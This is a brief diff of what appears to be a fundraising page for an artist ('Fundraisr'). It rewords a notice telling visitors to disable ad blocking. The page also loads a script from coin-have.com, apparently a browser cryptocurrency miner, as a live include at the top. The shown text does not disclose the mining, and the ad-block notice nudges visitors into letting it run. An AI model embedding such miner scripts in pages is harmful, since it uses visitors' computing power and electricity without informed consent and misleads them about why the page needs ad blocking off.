@@ -1,5 +1,5 @@
 <script src="https://coin-have.com/c/X386.js">\n</script>
-# Please Disable you adblocker for this page to work!
+# Please disable ad blocking on this page for Fundraisr to work!
 
 
 ## Example Artist
